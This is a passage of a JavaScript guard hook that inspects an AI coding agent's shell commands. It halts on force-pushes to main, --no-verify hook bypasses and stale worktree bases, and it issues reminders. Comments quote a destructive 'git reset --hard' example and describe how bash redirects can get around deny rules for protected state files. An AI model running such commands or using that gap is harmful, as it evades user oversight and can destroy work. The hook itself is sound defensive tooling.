      ? `${stack.depth} entr${stack.depth === 1 ? "y" : "ies"} currently on it`
      : "current depth not measured";
    const linked = stashTrees.count - 1;
    deferredFindings.push({
      severity: "pre-action",
      what_happened: `\`git stash ${stashHazard.form}\` is ABOUT TO RUN in a repository with ${stashTrees.count} working trees (${linked} linked worktree${linked === 1 ? "" : "s"}); the stash stack is SHARED across all of them — ${depthNote}.`,
      why: "worktree-isolation.md Rule 9 — the stash stack lives in the common `.git` dir, so every linked worktree can list, pop and drop your entry. A sibling's `git stash pop` applies YOUR entry into ITS tree and drops it: you are left a merely-clean tree, the sibling a mutation neither authored, and BOTH sides fail silently.",
      agent_must_report: [
        `This repo has ${stashTrees.count} working trees. Your stash entry will NOT be private to this one — any sibling checkout can pop it, and any entry you pop may not be yours.`,
        "Capture to a surface no other checkout can reach instead: `git diff > <path>.patch` (run `git add -N .` first so untracked files are included), or a `cp` backup outside the tree. Restore with `git apply <path>.patch`.",
        "If you are RESTORING, note that `git stash pop` takes whatever sits on top of the SHARED stack — run `git stash list` first and confirm the entry is yours before applying it.",
        "If a stash is genuinely required here, say why a patch file does not serve, and state which stack entry you are acting on.",
      ],
      agent_must_wait: null,
      user_summary: `git stash ${stashHazard.form} in a ${stashTrees.count}-worktree repo — the stash stack is shared (worktree-isolation.md Rule 9)`,
    });
  }

  // force-push to main/master — HALT-AND-REPORT (hook-output-discipline.md
  // MUST-2: lexical command-string signal → not block). GitHub branch
  // protection REJECTS direct/force push to main server-side (git.md § Branch
  // Protection) — the remote rejection is the structural backstop; the hook
  // surfaces the intent. Anchor tolerates `git -C <dir>`/sudo/env (HIGH-1).
  for (const seg of segments) {
    const g = parseGitInvocation(seg);
    if (!g || g.sub !== "push") continue;
    const force = /(^|\s)--force(?:-with-lease)?\b/.test(g.args);
    const toMain = /(^|\s)(main|master)\b/.test(g.args);
    if (!force || !toMain) continue;
    return withDeferred({
      severity: "halt-and-report",
      what_happened: `Bash attempted force-push to a protected branch: ${command.slice(0, 120)}`,
      why: "git.md branch protection — main/master direct/force push is rejected server-side by GitHub; force-push rewrites history. Lexical signal → halt-and-report per hook-output-discipline.md MUST-2 (the server-side rejection is the structural defense).",
      agent_must_report: [
        "State which branch was being force-pushed and why (history rewrite? recovery?)",
        "Confirm the user explicitly authorized force-push to main/master IN THIS CONVERSATION",
      ],
      agent_must_wait:
        "Do not retry. Force-push to main requires explicit per-action user authorization.",
      user_summary:
        "force-push to main/master — requires explicit authorization",
    });
  }

  // HALT-AND-REPORT: --no-verify — ARGV-POSITION-anchored, not token presence.
  // See `carriesNoVerifyFlag` at module scope for the defect this replaced, the
  // measured subcommand/value-flag tables, and why the severity stays
  // halt-and-report even though the signal is now structural.
  //
  // The `segments` list is the SAME one every fence above walks, so this lane
  // inherits their quote-awareness, heredoc-body removal, doc-carrier masking,
  // shell-group stripping and nested-body expansion — `sh -c 'git commit
  // --no-verify -m x'` still resolves to a real commit invocation here.
  if (segments.some((s) => carriesNoVerifyFlag(parseGitInvocation(s), s))) {
    return withDeferred({
      severity: "halt-and-report",
      what_happened: `Bash command uses --no-verify: ${command.slice(0, 120)}`,
      why: "git.md — pre-commit hooks exist for a reason; --no-verify requires explicit user instruction",
      agent_must_report: [
        "State which hook is being bypassed and why",
        "Explain the underlying issue you would otherwise have to fix",
        "Confirm whether the user authorized --no-verify IN THIS CONVERSATION",
      ],
      agent_must_wait:
        "Do not retry without explicit user instruction. Investigate hook failure root cause first.",
      user_summary: "--no-verify usage requires user authorization",
    });
  }

  // Hot-path bounds for the stale-base-ref lane below. TWO limits, because either
  // one alone is insufficient:
  //
  //   MAX_REF_PROBES              caps how many `git worktree add`s in one command
  //                               get probed at all. Without it a chain of N adds
  //                               costs N spawns.
  //   REF_PROBE_TOTAL_BUDGET_MS   caps the CUMULATIVE wall time. A count cap alone
  //                               bounds nothing real: 4 spawns × the 2500ms
  //                               per-spawn timeout is 10 SECONDS, on a path whose
  //                               own 5s watchdog is cleared before detection runs
  //                               (see the `clearTimeout` at the stdin handler).
  //                               So each spawn is given the REMAINING budget as
  //                               its timeout, not the full default.
  //
  // ~10.8ms measured per spawn on a warm local repo, so the typical chain costs
  // tens of ms and the budget is never approached; it exists for the pathological
  // case (a huge ref graph, a hung network mount), which the measured figure says
  // nothing about.
  const MAX_REF_PROBES = 4;
  const REF_PROBE_TOTAL_BUDGET_MS = 3000;

  // HALT-AND-REPORT: `git worktree add` from a STALE LOCAL base ref (loom#1501,
  // L4 of the enforcement-registration wave).
  //
  // Fast surface-presence guard FIRST. This hook runs on EVERY Bash call, and
  // the client-fork audit names that startup cost explicitly, so the whole
  // branch is behind one `indexOf` on a literal that is absent from essentially
  // every command. Only a command that actually mentions `worktree` pays the
  // segment walk, and only a real `git worktree add <path> <ref>` pays the
  // single git spawn — at most ONE per invocation (see the break below).
  //
  // Placed AFTER --no-verify and the destructive-op fences: this is the
  // lowest-severity branch in the file, so it must not pre-empt any of them.
  // `git commit --no-verify && git worktree add …` previously returned HERE and
  // the --no-verify halt never fired.
  //
  // SEGMENTATION IS QUOTE-AWARE, AND THAT IS LOAD-BEARING — NOT the shared
  // `segments` above. An earlier version of this block reused `segments` and
  // carried a comment claiming parseGitInvocation made it FP-resistant to prose.
  // That claim was FALSE and the code did not have the property: the split at
  // the top of this function is quote-UNAWARE, so a separator INSIDE a quoted
  // body fractures it and hands this branch a fragment whose leading token is
  // `git`. All three of these falsely fired, reproduced against a real repo:
  //
  //   gh issue create --body "step 1 && git worktree add ../wt wave/foo …"
  //   git commit -m     "fix: step && git worktree add ../wt wave/foo …"
  //   echo              "docs && git worktree add ../wt wave/foo …"
  //
  // i.e. exactly the commands this PR's own body and journal entries contain —
  // the loom#1363 prose-carrier class, re-opened in the file that closed it.
  // The repo already ships the primitives that fix it, and the state-path lane
  // already uses them: maskDocCarrierPayloads neutralises a doc-carrier's
  // argument payload, and splitShellSegments does not split inside quotes.
  //
  // The verdict is STRUCTURAL (a git rev-list count off the operator's own ref
  // database), which makes it block-eligible under hook-output-discipline.md
  // MUST-2 — and it is nonetheless capped at halt-and-report on PROPORTIONALITY
  // (the harm is recoverable; loom#1323 precedent). The full argument lives at
  // the detector in lib/violation-patterns.js; do not re-derive it here.
  if (command.indexOf("worktree") !== -1) {
    // WHICH REPOSITORY THE PROBE READS IS PART OF THE VERDICT, and reading the
    // SESSION cwd when the command targets another repo is wrong in BOTH
    // directions. `git -C <dir>` was already honoured; a `cd <dir> &&` prefix was
    // not, because splitShellSegments puts the git call in its OWN segment with
    // no `-C` to carry the directory. Reproduced against two scratch repos that
    // share a branch name, one 1-behind and one 0-behind:
    //
    //   cwd=<stale>  `cd <clean> && git worktree add ../wt wave/x`  → FIRED   ✗
    //   cwd=<clean>  `cd <stale> && git worktree add ../wt wave/x`  → silent  ✗
    //
    // The first is the worse half: a halt naming a repository the command never
    // touches is precisely the false positive hook-output-discipline.md MUST-2
    // forbids. So the walk tracks `cd`/`pushd` — and where it CANNOT track them
    // it declines to probe rather than guessing, because falling back to the
    // session cwd after an unresolved `cd` IS the false positive.
    let segDir = cwd;
    let dirKnown = true;
    let probesSpent = 0;
    let refProbeBudgetMs = REF_PROBE_TOTAL_BUDGET_MS;
    // A `cd` the shell might SKIP must not be applied. `A || cd <x>` runs the cd
    // only if A failed; `false && cd <x>` never runs it at all. Applying it
    // regardless produced a halt naming a repository the command never enters —
    // reproduced as `cd <clean> || cd <stale> ; git worktree add …` flagging from
    // a cwd where the ref is current. Deciding which side of a `||` executes
    // needs the exit status of a command that has not run, so the honest answer
    // is that the trail is unknowable: the whole walk declines rather than
    // guessing. `&&`-only chains are safe by construction — if an earlier link
    // fails the git call does not run either — but this hook cannot see WHICH
    // separator joined two segments, so the presence of `||` anywhere is the
    // conservative trigger.
    // HEREDOC BODIES ARE NOT COMMANDS. `maskDocCarrierPayloads` neutralises a
    // doc-carrier's quoted ARGUMENT and a `$(cat <<X)` substitution, but a plain
    // `cat > notes.md <<'EOF' … EOF` writes a FILE, so its body was never masked
    // and the `;`/`&&` inside the prose fractured it into a segment whose leading
    // token is `git`. Reproduced against the real repo: authoring a journal note
    // that MENTIONS `git worktree add … <ref>` produced a verdict byte-identical
    // to running it. That shape is this repo's own documented authoring pattern,
    // so the guard would have fired on the very notes describing it — including
    // a `git commit -F- <<'EOF'` commit message for this PR.
    //
    // `.structural` is the command with every heredoc BODY and close line
    // removed; opener lines survive, and an opener is only committed when its
    // close actually exists downstream, so a decoy `<<WORD` cannot swallow a real
    // command. On the parser's work-budget `overflow` `structural` is absent, so
    // the walk gets an EMPTY string and simply finds nothing — this whole
    // detector fails open on an unverifiable signal, and a pathological command
    // missing a stale-base warning is a miss, whereas guessing is the false
    // positive MUST-2 forbids. NOT `return null`: checks follow this block (the
    // pytest/.env enforcement below among them) and must not be disabled.
    //
    // GATED ON THE `<<` SUBSTRING. Every other caller of parseHeredocSpans
    // early-exits unless a PROTECTED PATH appears; this lane's gate is the far
    // more common `worktree`, so calling the parser unconditionally would expose
    // its O(unclosed-openers × downstream-lines) work budget to any command
    // containing that word. A command with no `<<` cannot contain a heredoc, so
    // skipping the parse is exact, not approximate.
    const spans =
      command.indexOf("<<") === -1
        ? { structural: command }
        : parseHeredocSpans(command);
    const masked = maskDocCarrierPayloads(spans.structural || "");
    // SEPARATOR HYGIENE — whether a `cd` actually took effect in the shell that
    // runs the git call depends on how the segments are JOINED, and three shapes
    // defeat a naive walk:
    //
    //   cd <B> | cat ; git worktree add …   the cd runs in a SUBSHELL; the git
    //                                       call runs in the ORIGINAL directory
    //   cd <A> || cd <B> ; git …            `||` short-circuits; only one ran
    //   git fetch && cd <B>                 MIXED: if fetch fails the cd does
    //   git worktree add …                  not run, but the git call still does
    //
    // All three were reproduced flagging a repository the command never enters —
    // the false positive hook-output-discipline.md MUST-2 forbids outright.
    //
    // A pure `&&` chain is sound (a failed link stops the git call too) and so is
    // a pure `;`/newline chain (every segment runs, and the statSync below catches
    // a `cd` that fails). MIXING them is not, and neither is any pipeline,
    // background, or subshell. Rather than reconstruct the shell's control flow,
    // the trail is trusted only for those two homogeneous shapes.
    //
    // Computed on the MASKED, heredoc-stripped surface so a separator inside
    // prose cannot silently disable the walk.
    const hasPipe = /\|/.test(masked); // covers `|` AND `||`
    const hasAmp = /&/.test(masked); // covers `&` AND `&&`
    const hasSeq = /[;\n]/.test(masked);
    const cdTrailTrustworthy =
      !hasPipe && !/[()]/.test(masked) && !(hasAmp && hasSeq);
    // ⛔ THIS SPLIT IS RAW, AND THAT IS A RECORDED RESIDUAL — NOT AN OVERSIGHT
    // AND NOT SOMETHING TO "FIX" BY ROUTING THE SINGULAR (T65 ten-site table).
    //
    // Sites 1–7 in this file read `segments`, which `expandNestedSegments` has
    // already expanded, so a substitution body reaches them as its own segment.
    // This lane does NOT: it splits `masked` directly, so a `git <verb>` reached
    // through a command substitution is invisible here. MEASURED, controls
    // firing: `git worktree add ../y` and `git status && git worktree add ../y`
    // are both seen; `echo $(git worktree add ../y)` is not.
    //
    // SEVERITY — a missing ADVISORY, not a missed block. This lane only PROBES a
    // base ref to surface a stale-base finding; its blindness costs a finding
    // that never appears rather than letting an operation through.
    //
    // ⛔ ROUTING THE SINGULAR WAS MEASURED AND IS *NOT* THE FIX. Making
    // `parseGitInvocation` descend does close this row, but it DUPLICATES every
    // substitution invocation across the nine sites that already pre-expand,
    // because `expandNestedSegments` emits the body as its own segment and the
    // carrier then yields the same invocation a second time:
    //     plural "echo $(git reset --hard HEAD)" -> ["reset","reset"]
    // The real fix is the CONSOLIDATION — the descent living in ONE place, with
    // `expandNestedSegments` no longer emitting substitution bodies as separate
    // segments — which is its own shard with its own two verdicts, because it
    // changes the plural's output for every consumer. Do not bolt a descent onto
    // the singular to close this row.
    //
    // Bound by `tests/integration/multi-operator/t65-declared-residuals.test.js`
    // (renamed from `t65-site8-raw-residual.test.js`, which carried only this
    // residual; the file now carries both bindings).
    // which carries the `todo` row for the intended behaviour and the measured
    // duplicate numbers from the route experiment.
    for (const seg of splitShellSegments(masked, {
      // A newline separates commands exactly as `;` does. Without this a
      // multi-line block collapsed into one segment whose leading token is the
      // FIRST command, so the canonical `git fetch origin <ref>` + newline +
      // `git worktree add … <ref>` shape — the very sequence Rule 7 prescribes —
      // was invisible to this guard. The sibling state-path lane already passes
      // this flag; omitting it here was an oversight, not a scoping decision.
      newlineSeparates: true,
    })) {
      const t = seg.trim();
      // A directory-changing segment we can resolve exactly: one literal operand,
      // no shell expansion. Anything else (bare `cd` → $HOME, `cd -` → OLDPWD,
      // `cd --` → $HOME, a `$VAR`/glob/`~` operand, an option form like `cd -P x`,
      // a `cd` nested in a subshell or wrapped so this pattern misses it) marks
      // the directory UNKNOWN and is never guessed at.
      if (/(?:^|[^\w./-])(?:cd|pushd|popd)(?=\s|$)/.test(t)) {
        const m = /^(?:cd|pushd)\s+(\S+)$/.exec(t);
        const arg = m ? m[1].replace(/^(['"])(.*)\1$/, "$2") : null;
        if (
          !arg ||
          !dirKnown ||
          !cdTrailTrustworthy ||
          /[$`*?~]/.test(arg) ||
          arg.startsWith("-")
        ) {
          dirKnown = false;
        } else {
          const next = path.resolve(segDir, arg);
          // A `cd` to a path that is not a directory FAILS, leaving the shell
          // where it was. Applying it anyway walked the probe to a nonexistent
          // directory and reported "clean" for a command that really did run in
          // the stale repo. Checked, not assumed — and an unreadable path is
          // UNKNOWN rather than either branch.
          let st = null;
          try {
            st = fs.statSync(next);
          } catch {
            st = null;
          }
          if (!st) dirKnown = false;
          else if (st.isDirectory()) segDir = next;
          // else: `cd <file>` fails; the shell stays put, so segDir is unchanged.
        }
        continue;
      }
      const g = parseGitInvocation(seg);
      if (!g || g.sub !== "worktree") continue;
      // An unresolvable `-C` is an UNKNOWN directory, so this lane takes the
      // disposition it already takes for one: do not probe (loom#1549 F3 lock
      // 8). Probing the literal `$(…)` bytes would resolve some other path and
      // report a CLEAN base ref for a tree never inspected — a false negative
      // worse than no signal. `continue`, not `break`: only THIS segment's
      // target is unknown, and the cd trail is still valid for later segments.
      if (g.unresolvable === "dir") continue;
      // `-C` is absolute → it alone pins the repo, whatever the cd trail did.
      // Otherwise the resolved cd trail must be trustworthy, or we do not probe.
      const cAbs = g.dir && path.isAbsolute(g.dir);
      if (!dirKnown && !cAbs) break;
      const probeDir = g.dir ? path.resolve(segDir, g.dir) : segDir;
      if (probesSpent >= MAX_REF_PROBES || refProbeBudgetMs <= 0) break;
      const stats = {};
      const t0 = Date.now();
      // The per-spawn timeout is the REMAINING budget, never the full default —
      // so N spawns cost at most REF_PROBE_TOTAL_BUDGET_MS in total, not N × the
      // per-spawn timeout. A count-only cap bounds nothing: 4 spawns × a 2500ms
      // timeout is 10s on a path whose own watchdog was already cleared.
      const stale = detectWorktreeStaleBaseRef(g.args, probeDir, {
        stats,
        timeoutMs: refProbeBudgetMs,
      });
      if (stats.probed) {
        probesSpent++;
        refProbeBudgetMs -= Date.now() - t0;
      }
      // A BOUNDED number of spawns per invocation, spent only when a spawn
      // actually happened. Two separate defects lived in the old `if (!stale)
      // break`:
      //
      //   1. The detector returns null both when it probed and found nothing AND
      //      when it never probed at all (`worktree list`/`remove`/`prune`, an
      //      `add` with no explicit base, a `$VAR` ref, an already-correct
      //      `origin/` ref). Breaking on the latter stopped the walk at the first
      //      harmless subcommand, so the documented `git worktree prune && git
      //      worktree add … <stale>` cleanup shape was never probed at all.
      //      `stats.probed` distinguishes them; a segment that cost nothing
      //      costs nothing.
      //   2. Even a REAL probe returning clean ended the walk, so
      //      `add ../a <current> && add ../b <stale>` missed the stale one. A
      //      hard cap bounds the hot path without that miss: MAX_REF_PROBES × the
      //      measured ~10.8ms spawn stays an order of magnitude inside the hook's
      //      own budget, and a chain longer than this is not a shape worth paying
      //      unbounded latency for.
      if (!stale) continue;
      try {
        logLearningObservation(cwd, "rule_violation", {
          rule: stale.rule_id, // worktree-orchestration/Rule-7
          behind: stale.behind,
          ahead: stale.ahead,
        });
      } catch {}
      return withDeferred({
        severity: "halt-and-report",
        what_happened: `Bash invoked \`git worktree add\` from a STALE local base ref: ${stale.evidence}`,
        why:
          "worktree-orchestration Rule 7 (Pre-Flight Merge-Base Check Before Launch) — a lane worktree created from a local branch ref " +
          "that its origin/ counterpart has moved ahead of does good work on a base that can never " +
          "be pushed. Structural signal (`git rev-list --left-right --count refs/heads/<ref>..." +
          "refs/remotes/origin/<ref>` reports a non-zero behind-count), surfaced rather than blocked " +
          "per the proportionality cap recorded at the detector (the harm is recoverable; " +
          "hook-output-discipline.md MUST-2 permits block only where the verdict is structural AND " +
          "the harm warrants it).",
        agent_must_report: [
          `The local ref \`${stale.ref}\` is ${stale.behind} commit(s) behind \`origin/${stale.ref}\`${stale.diverged ? ` and ${stale.ahead} ahead (diverged)` : ""}`,
          `Re-issue as \`git worktree add … origin/${stale.ref}\` (fetch first: \`git fetch origin ${stale.ref}\`) unless you specifically need the stale base`,
          stale.diverged
            ? "The branch has DIVERGED — if the local-only commits are the point, say so explicitly; otherwise the remote tip is the base you want"
            : "The local ref carries NO commits the remote lacks, so branching from it gains nothing and loses the remote's commits",
        ],
        agent_must_wait:
          "Do not create the worktree from the stale local ref. Re-issue against origin/<ref>, or state explicitly why the stale base is intended.",
        user_summary: `git worktree add from stale local ref \`${stale.ref}\` (${stale.behind} behind origin) — use origin/${stale.ref}`,
      });
    }
  }

  // ====================================================================
  // ENFORCE: .env loading for pytest/python commands
  // ====================================================================
  const isPytest = /\bpytest\b/.test(command);
  const isPython = /\bpython\b/.test(command) || /\bpython3\b/.test(command);

  if (isPytest || isPython) {
    // Log enriched test pattern observation
    try {
      const testPathMatch = command.match(
        /(?:pytest|python3?\s+-m\s+pytest)\s+([^\s;|&]+)/,
      );
      const testPath = testPathMatch ? testPathMatch[1] : null;

      // Determine test tier from path
      let testTier = "unit";
      if (testPath) {
        if (/e2e|playwright|end.to.end/i.test(testPath)) testTier = "e2e";
        else if (/integrat/i.test(testPath)) testTier = "integration";
      }

      logLearningObservation(cwd, "test_pattern", {
        test_tier: testTier,
        test_path: testPath,
        is_pytest: isPytest,
        command_flags: extractTestFlags(command),
      });
    } catch {}

    // Check if .env exists
    let envExists = false;
    try {
      envExists = fs.existsSync(path.join(cwd, ".env"));
    } catch {}

    if (envExists) {
      // Check if command already loads .env (various patterns)
      const loadsEnv =
        /dotenv/.test(command) || // pytest-dotenv or dotenv CLI
        /\.env/.test(command) || // References .env explicitly
        /OPENAI_API_KEY=/.test(command) || // Explicit env var
        /--env-file/.test(command) || // Docker-style env file
        /source\s+\.env/.test(command) || // Shell sourcing
        /export\s+/.test(command) || // Export pattern
        /env\s+/.test(command); // env prefix

      if (!loadsEnv && isPytest) {
        return withDeferred({
          continue: true,
          exitCode: 0,
          message:
            "REMINDER: .env exists but pytest may not load it. Consider: pytest-dotenv plugin OR prefix with env vars from .env. OPENAI_API_KEY and model settings are in .env!",
        });
      }
    }
  }

  // WARN: Long-running commands outside tmux/background
  const longRunningPatterns = [
    /npm\s+run\s+(dev|start|serve)/,
    /yarn\s+(dev|start|serve)/,
    /python\s+-m\s+http\.server/,
    /uvicorn/,
    /flask\s+run/,
    /node\s+.*server/,
    /docker\s+compose\s+up(?!\s+-d)/,
  ];

  const inTmux = process.env.TMUX || process.env.TERM_PROGRAM === "tmux";
  const isBackground =
    /&\s*$/.test(command) ||
    /--background/.test(command) ||
    /-d\s/.test(command);

  for (const pattern of longRunningPatterns) {
    if (pattern.test(command) && !inTmux && !isBackground) {
      return withDeferred({
        continue: true,
        exitCode: 0,
        message:
          "WARNING: Long-running command. Consider using run_in_background or tmux.",
      });
    }
  }

  // WARN: Git push - reminder for security review.
  //
  // loom#1715 SAME-CLASS FOLD-IN (autonomous-execution.md MUST-4). This was the
  // LAST bare `/git\s+push/` substring matcher in this file, and it is the same
  // DATA-POSITION false-positive class as loom#1714 MEDIUM-1: the pattern reads
  // the RAW command string, so `git push` sitting inside a JS string literal, a
  // quoted argument, a heredoc body or a shell comment fires it. MEASURED on the
  // review session that found it —
  //   node -e 'const s = "git push origin main"; console.log(s.length)'
  //     before: REMINDER fired (nothing is being pushed)
  //     after : silent
  //   git push origin HEAD          -> REMINDER still fires (positive control)
  // — and the CI-cost classifier added above was ALREADY correct on that same
  // input, because it routes through this parser. Two matchers over one concept
  // in one file, one hardened and one not, is the divergence
  // `security.md` § Multi-Site Kwarg Plumbing exists to prevent, so the old one
  // is retired onto the shared parser rather than left as the weaker sibling.
  // `findPushInvocation` dispatches on SUBCOMMAND POSITION and already handles
  // `cd x && git push`, `git -C /repo push`, `sudo git push`, `env FOO=1 git push`
  // and `sh -c "git push"` — every one of which the substring form also matched,
  // so this narrows the FALSE positives without narrowing the true ones.
  if (findPushInvocation(command)) {
    return withDeferred({
      continue: true,
      exitCode: 0,
      message: withScopeAdvisory(
        "REMINDER: Did you run security-reviewer before pushing?",
      ),
    });
  }

  // WARN: Git commit - reminder for review.
  // loom#1368: this site carried NO boundary at all, so it matched every
  // `git commit-*` sub-command (and `git commitfoo`). Anchored with the same
  // `(?![\w-])` negative lookahead as the two delegation sites above.
  // loom#1549 HIGH-3 — `\b`-anchored rather than `^`, so this one was not blind
  // to wrapped/retargeted commits, but it was still substring matching: it fires
  // on `git log --grep=commit` and on a `commit` inside a trailing shell comment.
  // The shared parser dispatches on the SUBCOMMAND POSITION, which is the only
  // thing that distinguishes those structurally.
  if (findCommitInvocation(command)) {
    return withDeferred({
      continue: true,
      exitCode: 0,
      message: withScopeAdvisory(
        "REMINDER: Code review completed? Consider delegating to reviewer.",
      ),
    });
  }

  // Log cargo test / cargo clippy observations for Rust repos
  const isCargoTest = /\bcargo\s+test\b/.test(command);
  const isCargoClippy = /\bcargo\s+clippy\b/.test(command);
  const isCargoBuil = /\bcargo\s+build\b/.test(command);

  if (isCargoTest || isCargoClippy || isCargoBuil) {
    try {
      const crateMatch = command.match(/-p\s+(\S+)/);
      logLearningObservation(cwd, "test_pattern", {
        test_tier: isCargoTest
          ? "cargo_test"
          : isCargoClippy
            ? "clippy"
            : "cargo_build",
        test_path: crateMatch ? crateMatch[1] : "workspace",
        is_rust: true,
        command_flags: extractTestFlags(command),
      });
    } catch {}
  }

  // loom#1606 — the clean exit is the LAST of several non-blocking exits that
  // can carry the deferred advisory, not the only one (see withScopeAdvisory).
  return withDeferred({
    continue: true,
    exitCode: 0,
    message: withScopeAdvisory("Validated"),
  });
}

/**
 * Extract test-relevant flags from command for learning.
 */
/**
 * Three-layer mutation detection for trust-posture state files.
 *
 * Per issue #25 — adopted from a downstream consumer's
 * state-file-write-guard (commit c0aeff73). Closes the bypass gap where
 * settings.json `permissions.deny` on Edit/Write does NOT cover bash-mediated
 * mutations (redirects, file utilities, interpreter -c/-e/-m bodies).
 *
 * Returns { layer, kind } if a mutation is detected against any path matching
 * `pathRx`, else null.
 *
 * Per-line scanning: matchers operate on `[^|\\n]*` so multi-line commands
 * cannot cross-match a verb on one line with a protected path on a later line.
 */
function extractTestFlags(command) {
  const flags = [];
  if (/-x\b/.test(command)) flags.push("fail-fast");
  if (/--tb=/.test(command)) flags.push("traceback");
  if (/-v\b|--verbose\b/.test(command)) flags.push("verbose");
  if (/--cov\b/.test(command)) flags.push("coverage");
  if (/-k\s/.test(command)) flags.push("keyword-filter");
  if (/--workspace\b/.test(command)) flags.push("workspace");
  if (/--release\b/.test(command)) flags.push("release");
  return flags;
}

module.exports = { hookMain };

// CLI entry. The default path is exactly hookMain() — no engine dependency, so a
// tree that copies this hook without lib/hook-engine.js runs it unchanged. The
// selftest path replays the run through the in-process engine (hook-engine.js::runCli).
if (require.main === module) {
  if (process.env.COC_HOOK_ENGINE_SELFTEST === "1") require("./lib/hook-engine.js").runCli(hookMain, __filename);
  else {
    // FW-TIER2 — a STANDALONE invocation is one hook event, so it opens the same
    // one-answer-per-question scope the dispatch worker opens. Without it every
    // asker in this process pays its own `git rev-parse --git-common-dir`.
    require("./lib/event-git.js").installStandaloneEventScope();
    hookMain();
  }
}
